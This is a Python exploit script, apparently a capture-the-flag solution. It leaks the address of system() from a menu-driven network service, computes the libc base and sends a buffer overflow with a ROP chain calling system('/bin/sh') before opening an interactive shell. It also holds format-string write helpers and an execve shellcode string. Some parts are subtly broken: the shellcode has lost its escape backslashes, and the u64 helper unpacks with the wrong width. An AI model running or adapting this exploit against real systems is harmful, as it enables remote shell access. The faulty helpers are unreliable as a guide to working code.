#!/usr/bin/python
# -*- coding: utf-8 -*-
  
import __main__, os, sys, struct, socket, telnetlib, subprocess, time  
  
# socat tcp-listen:4444,reuseaddr,fork exec:./a.out & 
def sock(remoteip="127.0.0.1", remoteport=4444):  
    __main__.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
    __main__.s.connect((remoteip, remoteport))  
    time.sleep(0.5)  
  
def writefile(buf_data,file_name):  
    with open(file_name, 'wb') as f:  
        f.write(buf_data)  
  
def recv(delim='\n'):  
    data = ''  
    while not data.endswith(delim):  
        data += s.recv(1)  
    print('\nrecv: \n' + data + '\n')  
    return data  
  
def recvn(x):  
    data = ''  
    data += s.recv(x)  
    print('\nrecv: \n' + data + '\n')  
    return data  
  
def send(x):  
    s.sendall(x + '\n')  
    print('\nsend: \n' + x + '\n')  
    time.sleep(0.5)  
  
def u(x):  
    return struct.unpack("<I",x[:4])[0]  
  
def u64(x):  
    return struct.unpack("<I",x[:8])[0]  
  
def p(x):  
    return struct.pack("<I",x)  
def p64(x):  
    return struct.pack("<Q",x) 

def shell():  
      print('---- interactive mode ----')  
      __main__.t = telnetlib.Telnet()  
      __main__.t.sock = s  
      __main__.t.interact()  
  
def format_string_attack1(buf_data, index_start, after_data):  
    __main__.buf += '%' + str( ((after_data-len(buf_data)-1)%0x100)+1 ) + 'c%' + str(index_start) + '$hhn'  
  
def format_string_attack4(buf_data, index_start, after_addr):  
    a = map(ord,p(after_addr))  
    b = map(ord,p(after_addr))  
    b[0] = ((a[0]-len(buf_data)-1) % 0x100) + 1  
    b[1] = ((a[1]-a[0]-1) % 0x100) + 1  
    b[2] = ((a[2]-a[1]-1) % 0x100) + 1  
    b[3] = ((a[3]-a[2]-1) % 0x100) + 1  
    __main__.buf += '%{0}c'.format(str(b[0])) + '%' + str(index_start+0) + '$hhn'  
    __main__.buf += '%{0}c'.format(str(b[1])) + '%' + str(index_start+1) + '$hhn'  
    __main__.buf += '%{0}c'.format(str(b[2])) + '%' + str(index_start+2) + '$hhn'  
    __main__.buf += '%{0}c'.format(str(b[3])) + '%' + str(index_start+3) + '$hhn'  
  
sc_execve = "x31xd2x52x68x2fx2fx73x68x68x2fx62x69x6ex89xe3x52x53x89xe1x8dx42x0bxcdx80"  
  
#-----------START EXPLOIT CODE-----------#  
import re
from subprocess import Popen, PIPE
from time import sleep
pop_rdi = 0x00021102 #: pop rdi ; ret  ;  (535 found)

menuReg = re.compile(r'.*Menu:\n.*',flags=re.DOTALL) #.を改行(\n)にもマッチさせる
def isMenu(s):
        return menuReg.match(s) is not None

sock()

flag = 1
line = recvn(1024)
if isMenu(line):
    send("2")
    recvn(1024)
    send("system")
    system = int(recvn(1024)[15:33],16)
    libc_base = system - 0x0000000000045390
    print "libc_base = %#018x" % libc_base
    print "system = %#018x" % (system)

buf = "AAAAAAAA"
buf += p64(libc_base + pop_rdi)
buf += p64(libc_base + 0x18cd17) # /bin/sh
buf += p64(system)

send("3")
recvn(1024)
send(str(len(buf)))
send(buf)
shell()
